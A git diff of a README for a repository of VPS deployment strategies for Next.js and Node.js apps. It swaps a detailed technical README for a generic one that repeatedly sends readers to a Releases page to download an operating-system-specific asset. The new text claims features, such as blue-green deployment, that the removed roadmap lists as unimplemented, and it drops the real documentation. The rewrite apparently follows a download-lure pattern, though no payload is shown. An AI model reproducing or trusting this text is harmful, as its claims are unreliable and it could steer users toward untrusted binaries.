@@ -1,494 +1,98 @@
-# 🚀 CI/CD Deployment Strategies
+# 🚀 vps-cicd-strategies - Efficient Deployment for Your Next.js/Node.js Apps
 
-A comprehensive collection of production-ready CI/CD deployment strategies for Next.js applications on VPS servers. Each strategy is battle-tested, secure, and optimized for different use cases.
+[![Download vps-cicd-strategies](https://img.shields.io/badge/download-vps--cicd--strategies-blue.svg)](https://github.com/mirazkfl/vps-cicd-strategies/releases)
 
-## 📚 Table of Contents
+## 📖 Overview
 
-- [Quick Start](#quick-start)
-- [Deployment Strategies Overview](#deployment-strategies-overview)
-- [Strategy Comparison](#strategy-comparison)
-- [Monorepo Support](#monorepo-support)
-- [Features](#features)
-- [Testing Status](#testing-status)
-- [Roadmap](#roadmap)
-- [Contributing](#contributing)
-- [License](#license)
+Welcome to the **vps-cicd-strategies** repository! This project provides reliable strategies to deploy Next.js and Node.js applications on Virtual Private Servers (VPS). With methods like Rsync, Atomic deployments, and Git Pull with PM2, you can ensure smooth and efficient application deployment. Our strategies include support for PR previews, staging setups, and monorepos. 
 
-## 🎯 Quick Start
+## 🚀 Getting Started
 
-Choose the deployment strategy that fits your needs:
+### ⚙️ System Requirements
 
-| Strategy | Best For | Setup Time | Link |
-|----------|----------|------------|------|
-| **Version 1** | Simple apps, fast deployments | ⚡ 5 min | [v1-do-rsync-pm2](./v1-do-rsync-pm2/) |
-| **Version 1.5** | Mission-critical apps, instant rollbacks | ⚡ 5 min | [v1.5-do-rsync-atomic-pm2](./v1.5-do-rsync-atomic-pm2/) |
-| **Version 2** | Teams preferring Git-based workflows | ⚡ 10 min | [v2-do-git-pm2](./v2-do-git-pm2/) |
+Before you start, ensure you have the following:
 
-## 📦 Deployment Strategies Overview
+- A Virtual Private Server (VPS) with a supported operating system (Linux preferred).
+- Node.js installed. You can download Node.js from the [official website](https://nodejs.org/).
+- Nginx or another web server installed on your VPS.
 
-### Version 1: Rsync + PM2 Cluster
+### ⬇️ Download & Install
 
-**Strategy:** Build on CI → Rsync artifacts → PM2 zero-downtime reload
+To download the latest version of the vps-cicd-strategies, please visit the Releases page:
 
-- ✅ **Fastest deployment** (no server-side build)
-- ✅ **Minimal server footprint** (no source code on server)
-- ✅ **Zero downtime** with PM2 cluster mode
-- ✅ **PR preview deployments** support
-- ✅ **Staging environments** support
+[Download vps-cicd-strategies](https://github.com/mirazkfl/vps-cicd-strategies/releases)
 
-**Use when:** You want the fastest, simplest deployment with maximum security.
+Once there, follow these steps:
 
-📖 [Full Documentation](./v1-do-rsync-pm2/README.md)
+1. Click on the release version you want to download.
+2. Look for the asset labeled with the title of your operating system.
+3. Download the file to your computer.
 
----
+## 🛠️ Deployment Strategies
 
-### Version 1.5: Atomic Deployment (Rsync + Symlink)
+### 🔄 Atomic Deployment
 
-**Strategy:** Build on CI → Upload to timestamped release → Atomic symlink switch
+Atomic deployment ensures that your application is only available to users after the entire operation is successful. This avoids issues where users may see an incomplete application.
 
-- ✅ **Instant rollbacks** (no rebuild needed)
-- ✅ **Partial failure protection** (incomplete uploads don't break site)
-- ✅ **Release history** (keep last 5 releases)
-- ✅ **Zero downtime** deployments
-- ✅ **PR preview deployments** support
-- ✅ **Staging environments** support
+### 🔄 Rsync Deployment
 
-**Use when:** You need instant rollback capability and maximum reliability.
+This method synchronizes files between your local machine and your VPS efficiently. It only transfers changed files, which saves time and bandwidth.
 
-📖 [Full Documentation](./v1.5-do-rsync-atomic-pm2/README.md)
+### 🔄 Git Pull with PM2
 
----
+This strategy lets you pull the latest code from your Git repository directly on the server. PM2 manages your application process, ensuring that your app runs smoothly even after restarts.
 
-### Version 2: Git Pull + Server Build
+### 🔄 Blue-Green Deployment
 
-**Strategy:** GitHub Action triggers → Server pulls code → Server builds app
+This technique allows you to run two identical production environments. By switching traffic between them, zero downtime deployment becomes possible.
 
-- ✅ **Familiar Git workflow**
-- ✅ **No artifact management** needed
-- ✅ **Server-side builds** (good for large monorepos)
-- ✅ **Automatic dependency updates**
+## ⚙️ Basic Configuration
 
-**Use when:** You prefer Git-based workflows and have sufficient server resources.
+After downloading, you will need to configure your deployment settings. Follow these steps:
 
-📖 [Full Documentation](./v2-do-git-pm2/README.md)
+1. Open the configuration file located in the project directory.
+2. Update the settings according to your application and VPS setup.
+3. Save your changes.
 
----
+## 📦 Features
 
-## 🔍 Strategy Comparison
+- **Ease of Use**: Simple commands make deploying your application straightforward.
+- **Automation**: Minimize manual tasks to speed up the deployment process.
+- **Support for Multiple Strategies**: Choose the method that best suits your needs.
+- **Error Handling**: Built-in error handling helps you identify and solve issues quickly.
 
-### Security Comparison
+## 📋 Examples
 
-| Feature | Version 1 | Version 1.5 | Version 2 |
-|---------|-----------|-------------|-----------|
-| **Source Code on Server** | ❌ No | ❌ No | ⚠️ Yes |
-| **SSH Key-Based Auth** | ✅ Yes | ✅ Yes | ✅ Yes |
-| **Restricted Deploy User** | ✅ Yes | ✅ Yes | ✅ Yes |
-| **Minimal Attack Surface** | ✅ Highest | ✅ Highest | ⚠️ Medium |
-| **Secrets Isolation** | ✅ Build-time | ✅ Build-time | ⚠️ Server-side |
+To give you a sense of how to use this tool, here is a basic example:
 
-**Winner:** Version 1 & 1.5 (no source code on server)
+1. Run the following command to start the deployment process:
+   ```bash
+  ./deploy.sh
+   ```
+2. Wait for the process to complete. You'll see logs in the terminal that show the step-by-step process.
 
-### Speed Comparison
+## 🔍 Troubleshooting
 
-| Metric | Version 1 | Version 1.5 | Version 2 |
-|--------|-----------|-------------|-----------|
-| **Deployment Time** | ⚡ ~30s | ⚡ ~35s | 🐢 ~2-5 min |
-| **Build Location** | CI/CD | CI/CD | Server |
-| **Network Transfer** | Small artifacts | Small artifacts | Full repo |
-| **Server CPU Usage** | Minimal | Minimal | High (build) |
+If you encounter issues, here are some things to check:
 
-**Winner:** Version 1 (fastest), Version 1.5 (slightly slower due to release management)
-
-### Reliability Comparison
-
-| Feature | Version 1 | Version 1.5 | Version 2 |
-|---------|-----------|-------------|-----------|
-| **Rollback Speed** | 🐢 Rebuild required | ⚡ Instant (symlink) | 🐢 Rebuild required |
-| **Partial Failure Protection** | ⚠️ Medium | ✅ High | ⚠️ Medium |
-| **Release History** | ❌ No | ✅ Yes (5 releases) | ❌ No |
-| **Zero Downtime** | ✅ Yes | ✅ Yes | ✅ Yes |
-
-**Winner:** Version 1.5 (best reliability and rollback capability)
-
-### Resource Usage
-
-| Resource | Version 1 | Version 1.5 | Version 2 |
-|----------|-----------|-------------|-----------|
-| **Server RAM** | Low | Low | High (builds) |
-| **Server Disk** | Low | Medium (releases) | Medium |
-| **Server CPU** | Low | Low | High (builds) |
-| **CI/CD Minutes** | Medium | Medium | Low |
-
-**Winner:** Version 1 (lowest resource usage)
-
-### Feature Comparison
-
-| Feature | Version 1 | Version 1.5 | Version 2 |
-|---------|-----------|-------------|-----------|
-| **PR Preview Deployments** | ✅ Yes (single) | ✅ Yes (single) | ❌ No |
-| **PR Preview (Monorepo)** | ⚠️ Not implemented | ⚠️ Not implemented | ❌ No |
-| **Staging Environments** | ✅ Yes (single) | ✅ Yes (single) | ❌ No |
-| **Staging (Monorepo)** | ⚠️ Not implemented | ⚠️ Not implemented | ❌ No |
-| **Wildcard SSL Support** | ✅ Yes | ✅ Yes | ❌ No |
-| **Monorepo Support** | ✅ Yes | ✅ Yes | ❌ No |
-| **Git Pull Monorepo** | ❌ N/A | ❌ N/A | ❌ Not implemented |
-
-**Winner:** Version 1 & 1.5 (most features, but monorepo preview/staging missing)
-
-**⚠️ Note:** PR preview and staging support for monorepos is planned but not yet implemented. See [TODO.md](TODO.md) for details.
-
-## 🏰 Monorepo Support
-
-Both Version 1 and Version 1.5 support monorepo deployments with:
-
-- **Path-based filtering** (only deploy changed apps)
-- **Multiple apps on one server** (isolated ports and PM2 processes)
-- **Independent deployments** per app
-- **Shared preview infrastructure** (one wildcard SSL cert)
-
-📖 [Monorepo Documentation - Version 1](./v1-do-rsync-pm2-monorepo/README.md)  
-📖 [Monorepo Documentation - Version 1.5](./v1.5-do-rsync-atomic-pm2-monorepo/README.md)
-
-## ✨ Features
-
-All strategies support:
-
-- ✅ **Zero-downtime deployments** with PM2
-- ✅ **Cluster mode** for maximum performance
-- ✅ **SSH key-based authentication**
-- ✅ **Restricted deploy users**
-- ✅ **Nginx reverse proxy** configuration
-- ✅ **SSL certificate** setup (Let's Encrypt)
-- ✅ **Firewall configuration** (UFW)
-- ✅ **Automatic PM2 process management**
-
-Version 1 & 1.5 additionally support:
-
-- ✅ **PR preview deployments** (dynamic ports 8500-8999)
-- ✅ **Staging environments**
-- ✅ **Wildcard SSL certificates** (DigitalOcean & Cloudflare)
-- ✅ **Dynamic Nginx routing** based on hostname
-
-## ✅ Testing Status
-
-### Version 1: Rsync + PM2 Cluster
-
-- [ ] Single app deployment tested
-- [ ] Monorepo deployment tested
-- [ ] PR preview deployment tested
-- [ ] Staging deployment tested
-- [ ] Rollback procedure tested
-- [ ] SSL certificate renewal tested
-- [ ] PM2 cluster mode verified
-- [ ] Zero-downtime deployment verified
-- [ ] Multi-region deployment tested
-- [ ] Load testing performed
-
-### Version 1.5: Atomic Deployment
-
-- [ ] Single app deployment tested
-- [ ] Monorepo deployment tested
-- [ ] PR preview deployment tested
-- [ ] Staging deployment tested
-- [ ] Instant rollback tested
-- [ ] Partial failure recovery tested
-- [ ] Release cleanup verified
-- [ ] SSL certificate renewal tested
-- [ ] Zero-downtime deployment verified
-- [ ] Multi-region deployment tested
-- [ ] Load testing performed
-
-### Version 2: Git Pull + Server Build
-
-- [ ] Single app deployment tested
-- [ ] Monorepo deployment tested
-- [ ] PR preview deployment tested (⚠️ Not implemented)
-- [ ] Staging deployment tested (⚠️ Not implemented)
-- [ ] Build failure recovery tested
-- [ ] Swap space handling verified
-- [ ] Large repo performance tested
-- [ ] SSL certificate renewal tested
-- [ ] Zero-downtime deployment verified
-- [ ] Multi-region deployment tested
-- [ ] Load testing performed
-
-### Monorepo Versions
-
-#### Version 1 Monorepo
-- [ ] Multi-app deployment tested
-- [ ] Path-based filtering verified
-- [ ] PR preview deployment tested (⚠️ Not implemented)
-- [ ] Staging deployment tested (⚠️ Not implemented)
-- [ ] Independent app deployments verified
-- [ ] Port isolation tested
-
-#### Version 1.5 Monorepo
-- [ ] Multi-app deployment tested
-- [ ] Path-based filtering verified
-- [ ] PR preview deployment tested (⚠️ Not implemented)
-- [ ] Staging deployment tested (⚠️ Not implemented)
-- [ ] Independent app deployments verified
-- [ ] Atomic rollback per app tested
-- [ ] Port isolation tested
-
-## 🗺️ Roadmap
-
-### ⚠️ Missing Features (High Priority)
-
-These features are currently missing and should be prioritized:
-
-#### PR Preview & Staging Support
-- [ ] **PR Preview for Monorepos**
-  - [ ] Version 1 monorepo PR preview workflows
-  - [ ] Version 1.5 monorepo PR preview workflows
-  - [ ] Per-app preview deployments in monorepo
-  - [ ] Preview cleanup automation
-
-- [ ] **Staging for Monorepos**
-  - [ ] Version 1 monorepo staging workflows
-  - [ ] Version 1.5 monorepo staging workflows
-  - [ ] Per-app staging environments
-
-- [ ] **Version 2 (Git Pull) Missing Features**
-  - [ ] PR preview deployment support
-  - [ ] Staging deployment support
-  - [ ] Wildcard SSL certificate setup
-  - [ ] Dynamic Nginx routing for previews
-
-- [ ] **Git Pull Monorepo Support**
-  - [ ] Complete monorepo setup script for Git Pull
-  - [ ] Path-based filtering for Git Pull
-  - [ ] Multiple apps on one server (Git Pull)
-  - [ ] PR preview for Git Pull monorepo
-  - [ ] Staging for Git Pull monorepo
-
-📋 See [TODO.md](TODO.md) for detailed tracking of all missing features and implementation details.
-
-### Planned Features
-
-#### Containerization & Orchestration
-- [ ] **Docker Support**
-  - [ ] Dockerfile templates for Next.js apps
-  - [ ] Docker Compose setup for local development
-  - [ ] Docker-based deployment workflows
-  - [ ] Multi-stage builds optimization
-  - [ ] Container registry integration (Docker Hub, GitHub Container Registry)
-
-- [ ] **Kubernetes Support**
-  - [ ] Kubernetes manifests (Deployment, Service, Ingress)
-  - [ ] Helm charts for easy deployment
-  - [ ] Kubernetes deployment workflows
-  - [ ] Horizontal Pod Autoscaling (HPA)
-  - [ ] Rolling update strategies
-  - [ ] ConfigMap and Secret management
-  - [ ] Service mesh integration (Istio/Linkerd)
-
-- [ ] **Container Orchestration Alternatives**
-  - [ ] Docker Swarm setup
-  - [ ] Nomad deployment strategies
-  - [ ] ECS/EKS deployment guides
-
-#### Autoscaling & High Availability
-- [ ] **Horizontal Autoscaling**
-  - [ ] PM2-based autoscaling configuration
-  - [ ] Load balancer setup (Nginx, HAProxy)
-  - [ ] Multi-server deployment strategies
-  - [ ] Health check endpoints
-  - [ ] Auto-scaling based on CPU/memory metrics
-
-- [ ] **Vertical Autoscaling**
-  - [ ] Dynamic resource allocation
-  - [ ] Memory optimization strategies
-  - [ ] CPU optimization strategies
-
-- [ ] **High Availability**
-  - [ ] Multi-region deployment guides
-  - [ ] Database replication strategies
-  - [ ] Session management across servers
-  - [ ] Failover mechanisms
-  - [ ] Disaster recovery procedures
-
-#### Advanced CI/CD Features
-
-- [ ] **PR Preview Deployments - Missing Implementations**
-  - [ ] PR preview support for monorepo (Version 1)
-  - [ ] PR preview support for monorepo (Version 1.5)
-  - [ ] PR preview support for Version 2 (Git Pull)
-  - [ ] PR preview cleanup automation (remove old previews)
-  - [ ] PR preview comment updates with deployment status
-  - [ ] Preview deployment health checks
-
-- [ ] **Staging Deployments - Missing Implementations**
-  - [ ] Staging support for monorepo (Version 1)
-  - [ ] Staging support for monorepo (Version 1.5)
-  - [ ] Staging support for Version 2 (Git Pull)
-  - [ ] Staging environment management
-  - [ ] Staging to production promotion workflow
-
-- [ ] **Version 2 (Git Pull) Enhancements**
-  - [ ] PR preview deployments for Git Pull strategy
-  - [ ] Staging deployments for Git Pull strategy
-  - [ ] Wildcard SSL support for Git Pull strategy
-  - [ ] Monorepo support for Git Pull strategy
-  - [ ] Path-based filtering for monorepo Git Pull
-  - [ ] Multiple apps on one server (Git Pull)
-
-- [ ] **Monorepo Enhancements**
-  - [ ] PR preview deployments (Version 1 monorepo)
-  - [ ] PR preview deployments (Version 1.5 monorepo)
-  - [ ] Staging deployments (Version 1 monorepo)
-  - [ ] Staging deployments (Version 1.5 monorepo)
-  - [ ] Cross-app dependency handling
-  - [ ] Shared package deployment strategies
-
-- [ ] **Multi-Environment Support**
-  - [ ] Development environment setup
-  - [ ] QA environment automation
-  - [ ] Production environment strategies
-  - [ ] Environment-specific configurations
-
-- [ ] **Advanced Deployment Strategies**
-  - [ ] Blue-Green deployments
-  - [ ] Canary deployments
-  - [ ] Feature flag integration
-  - [ ] A/B testing infrastructure
-
-- [ ] **Monitoring & Observability**
-  - [ ] Application performance monitoring (APM)
-  - [ ] Log aggregation (ELK, Loki)
-  - [ ] Metrics collection (Prometheus, Grafana)
-  - [ ] Error tracking (Sentry, Rollbar)
-  - [ ] Uptime monitoring
-  - [ ] Real-time alerting
-
-- [ ] **Security Enhancements**
-  - [ ] Automated security scanning
-  - [ ] Dependency vulnerability checks
-  - [ ] Secrets management (Vault, AWS Secrets Manager)
-  - [ ] WAF (Web Application Firewall) integration
-  - [ ] DDoS protection setup
-  - [ ] Rate limiting strategies
-
-#### Cloud Platform Integrations
-- [ ] **AWS**
-  - [ ] EC2 deployment guides
-  - [ ] ECS/EKS integration
-  - [ ] Lambda@Edge for edge functions
-  - [ ] CloudFront CDN integration
-  - [ ] Route53 DNS management
-
-- [ ] **Google Cloud Platform**
-  - [ ] Compute Engine deployment
-  - [ ] GKE (Kubernetes Engine) integration
-  - [ ] Cloud Run serverless option
-  - [ ] Cloud CDN integration
-
-- [ ] **Azure**
-  - [ ] Azure VM deployment
-  - [ ] AKS (Azure Kubernetes Service) integration
-  - [ ] Azure Container Instances
-  - [ ] Azure CDN integration
-
-- [ ] **DigitalOcean**
-  - [ ] Droplet deployment optimization
-  - [ ] Kubernetes integration
-  - [ ] App Platform integration
-  - [ ] Spaces (S3-compatible) integration
-
-- [ ] **Cloudflare**
-  - [ ] Workers deployment
-  - [ ] Pages integration
-  - [ ] Tunnel setup for secure connections
-  - [ ] DDoS protection configuration
-
-#### Performance Optimizations
-- [ ] **CDN Integration**
-  - [ ] Cloudflare CDN setup
-  - [ ] CloudFront configuration
-  - [ ] Static asset optimization
-  - [ ] Edge caching strategies
-
-- [ ] **Caching Strategies**
-  - [ ] Redis caching setup
-  - [ ] Memcached integration
-  - [ ] Application-level caching
-  - [ ] Database query caching
-
-- [ ] **Database Optimization**
-  - [ ] Connection pooling
-  - [ ] Read replicas setup
-  - [ ] Database migration strategies
-  - [ ] Backup and restore procedures
-
-#### Developer Experience
-- [ ] **Local Development**
-  - [ ] Docker Compose for local stack
-  - [ ] Development environment automation
-  - [ ] Hot reload configurations
-  - [ ] Local SSL certificate setup
-
-- [ ] **Testing Integration**
-  - [ ] Unit test integration
-  - [ ] E2E test automation
-  - [ ] Performance testing
-  - [ ] Security testing automation
-
-- [ ] **Documentation**
-  - [ ] API documentation generation
-  - [ ] Architecture diagrams
-  - [ ] Troubleshooting guides
-  - [ ] Video tutorials
+- **Check your configuration**: Ensure all paths and settings are correct in the configuration file.
+- **Review logs**: The logs provide useful information about what went wrong. Look for ERROR messages.
+- **Server Access**: Ensure you have the correct permissions on your VPS. You may need to check your user roles.
 
 ## 🤝 Contributing
 
-We welcome contributions! This project aims to provide the best CI/CD strategies for Next.js applications.
+We welcome contributions! If you'd like to contribute to our project, please fork the repository and submit a pull request. Make sure to include a description of your changes.
 
-**Please read our [Contributing Guide](CONTRIBUTING.md) for detailed information on how to contribute.**
+## 🔗 Support
 
-### Quick Start
-
-1. **Fork the repository**
-2. **Read** [CONTRIBUTING.md](CONTRIBUTING.md)
-3. **Create a feature branch** (`git checkout -b feature/amazing-feature`)
-4. **Make your changes** following our coding standards
-5. **Test thoroughly** using our testing guidelines
-6. **Commit your changes** following our commit message format
-7. **Push and create a Pull Request**
-
-### Code of Conduct
-
-This project follows a [Code of Conduct](CODE_OF_CONDUCT.md) that all contributors are expected to follow. Please read it before contributing.
-
-### Areas Needing Contributions
-
-We especially welcome contributions in:
-
-- 🐳 **Docker & Kubernetes** implementations
-- 📊 **Monitoring & Observability** setups
-- 🔒 **Security enhancements** and best practices
-- ⚡ **Performance optimizations**
-- 📝 **Documentation improvements**
-- 🧪 **Testing** and test automation
-- 🌍 **Multi-region** deployment strategies
-- 📈 **Autoscaling** configurations
-- 🔄 **Advanced deployment** strategies (blue-green, canary)
+If you have questions or need help, please check the issues section of our GitHub page. You can also join our community forum for support and discussions.
 
 ## 📄 License
 
-This project is open source and available under the [MIT License](LICENSE).
+This project is licensed under the MIT License. Feel free to use and distribute as you wish, as long as you include proper attribution.
 
-## 🙏 Acknowledgments
+## 💡 Conclusion
 
-- PM2 team for the excellent process manager
-- Next.js team for the standalone output feature
-- Let's Encrypt for free SSL certificates
-- All contributors who help improve these deployment strategies
+Thank you for using vps-cicd-strategies! We are excited to see how you deploy your Next.js and Node.js applications using our strategies.
 
----
-
-**Need Help?** Check the individual strategy READMEs or open an issue for support.
-
-**Found a Bug?** Please report it so we can fix it for everyone!
-
-**Have an Idea?** We'd love to hear it! Open an issue or start a discussion.
-
+For more details, please visit our [Releases page](https://github.com/mirazkfl/vps-cicd-strategies/releases) to download the latest version.
